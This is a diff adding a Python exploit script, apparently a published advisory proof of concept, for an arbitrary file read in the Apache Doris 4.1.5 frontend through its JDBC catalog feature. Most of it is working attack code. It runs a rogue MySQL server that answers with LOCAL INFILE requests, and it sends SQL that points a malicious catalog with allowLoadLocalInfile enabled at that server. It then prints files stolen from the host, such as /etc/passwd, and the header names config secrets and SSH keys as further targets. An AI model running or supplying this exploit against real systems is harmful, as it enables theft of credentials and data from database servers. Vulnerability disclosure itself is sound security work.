@@ -1,0 +1,161 @@
+#!/usr/bin/env python
+#
+#
+# Apache Doris 4.1.5 JDBC Catalog Arbitrary File Read
+#
+#
+# Vendor: The Apache Software Foundation
+# Product web page: https://doris.apache.org
+# Affected version: 4.1.5
+#
+# Summary: Apache Doris is a high-performance, real-time analytical database
+# based on the MPP architecture. Known for being efficient, simple, and unified,
+# it returns query results over massive datasets within sub-second latency,
+# and a single system supports both high-concurrency point queries and high
+# throughput complex analytics.
+#
+# Desc: Apache Doris (Frontend) suffers from an arbitrary local file read through
+# its JDBC catalog feature, and exposes an unsafe-deserialization option to the
+# same attack surface. Connection properties for a JDBC catalog are passed to the
+# MySQL driver without a safe allow-list (handleJdbcUrl() forces only benign params),
+# so a user who can define or point a catalog at an attacker-controlled MySQL endpoint
+# can enable dangerous driver options that the FE's JDBC client will honor. With
+# allowLoadLocalInfile=true, a rogue MySQL server can answer any query with a LOCAL
+# INFILE request and read arbitrary files from the FE host (fe/conf/fe.conf secrets,
+# keytab, id_rsa).
+#
+# Additionally, because autoDeserialize is not forced off, a malicious server can
+# return a crafted blob that the driver deserializes. This can lead to remote code
+# execution only if a suitable gadget is present on the Doris classpath.
+#
+# Tested on: MySQL Connector/J 8.0.33
+#            Doris FE 4.1.5
+#            JDK 17
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2026-6023
+# Advisory URL: https://www.zeroscience.mk/#/advisories/ZSL-2026-6023
+#
+#
+# 13.08.2026
+#
+
+
+import subprocess
+import threading#
+import socket####
+import struct####
+import time######
+import sys#######
+
+FE_HOST, FE_PORT = "192.168.1.2", 9030
+FE_USER, FE_PASS = "root", ""
+ROGUE_HOST       = "192.168.1.100"
+ROGUE_PORT       = 13306
+TARGET_FILE      = "/etc/passwd" # ../fe/conf/fe.conf)
+DRIVER_URL       = "mysql-connector-java-8.0.33.jar"
+CATALOG          = "zsl_evil"
+
+_stolen = {"data": None}
+
+def _pkt(seq, payload):
+    return struct.pack("<I", len(payload))[:3] + bytes([seq]) + payload
+
+def _recv_pkt(c):
+    hdr = c.recv(4)
+    if len(hdr) < 4:
+        return None
+    ln = hdr[0] | (hdr[1] << 8) | (hdr[2] << 16)
+    data = b""
+    while len(data) < ln:
+        chunk = c.recv(ln - len(data))
+        if not chunk:
+            break
+        data += chunk
+    return data
+
+def _handshake():
+    caps = 0x00000001 | 0x00000080 | 0x00000200 | 0x00008000 | 0x00080000
+    p  = b"\x0a" + b"5.7.40-rogue\x00" + struct.pack("<I", 1)
+    p += b"12345678" + b"\x00" + struct.pack("<H", caps & 0xffff) + b"\x21"
+    p += struct.pack("<H", 0x0002) + struct.pack("<H", (caps >> 16) & 0xffff)
+    p += b"\x15" + b"\x00" * 10 + b"1234567890AB\x00" + b"mysql_native_password\x00"
+    return p
+
+_OK = b"\x00\x00\x00\x02\x00\x00\x00"
+
+def rogue_server():
+    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    srv.bind(("0.0.0.0", ROGUE_PORT)); srv.listen(5)
+    print("[+] Rogue MySQL: 0.0.0.0:%d (LOCAL INFILE '%s')" % (ROGUE_PORT, TARGET_FILE))
+    while _stolen["data"] is None:
+        try:
+            c, addr = srv.accept()
+        except OSError:
+            break
+        print("[*] FE connected    : %s" % (addr,))
+        try:
+            c.sendall(_pkt(0, _handshake()))
+            _recv_pkt(c)
+            c.sendall(_pkt(2, _OK))
+            while True:
+                data = _recv_pkt(c)
+                if not data:
+                    break
+                if data[0] == 0x03:
+                    c.sendall(_pkt(1, b"\xfb" + TARGET_FILE.encode()))
+                    filedata = _recv_pkt(c) or b""
+                    _stolen["data"] = filedata.decode("utf-8", "replace")
+                    _recv_pkt(c); c.sendall(_pkt(3, _OK))
+                    break
+                else:
+                    c.sendall(_pkt(1, _OK))
+        except Exception:
+            pass
+        finally:
+            c.close()
+    srv.close()
+
+def doris_sql():
+    url = ("jdbc:mysql://%s:%d/mysql?allowLoadLocalInfile=true&allowLoadLocalInfileInPath=/"
+           "&useSSL=false" % (ROGUE_HOST, ROGUE_PORT))
+    return ("DROP CATALOG IF EXISTS %s;"
+            "CREATE CATALOG %s PROPERTIES('type'='jdbc','user'='x','password'='x',"
+            "'jdbc_url'='%s','driver_url'='%s','driver_class'='com.mysql.cj.jdbc.Driver');"
+            "REFRESH CATALOG %s; SHOW DATABASES FROM %s;"
+            % (CATALOG, CATALOG, url, DRIVER_URL, CATALOG, CATALOG))
+
+def trigger():
+    sql = doris_sql()
+    print("[*] Doris FE: %s:%d  (user %s)\n[*] SQL:\n    %s\n" % (FE_HOST, FE_PORT, FE_USER, sql))
+    cmd = ["mysql", "-h", FE_HOST, "-P", str(FE_PORT), "-u", FE_USER, "--connect-timeout=10", "-e", sql]
+    if FE_PASS:
+        cmd.insert(1, "-p" + FE_PASS)
+    try:
+        subprocess.run(cmd, timeout=40)
+        print("[+] SQL sent to Doris FE.")
+    except FileNotFoundError:
+        print("[-] `mysql` client not found")
+    except Exception as e:
+        print("[-] Could not reach Doris FE (%s)." % e)
+
+if __name__ == "__main__":
+    print("Apache Doris FE <=4.1.5 JDBC Catalog Arbitrary File Read (ZSL-2026-6023)")
+    threading.Thread(target=rogue_server, daemon=True).start()
+    time.sleep(0.3)
+    trigger()
+    print("\n[*] Waiting for the FE JDBC client to hit the rogue server (Ctrl-C to stop) ...")
+    for _ in range(120):
+        if _stolen["data"] is not None:
+            print("=" * 68)
+            print("[+] STOLEN FROM THE DORIS FE HOST -> '%s':\n" % TARGET_FILE + _stolen["data"])
+            print("=" * 68)
+            break
+        time.sleep(1)
+    else:
+        print("[-] No file received.")
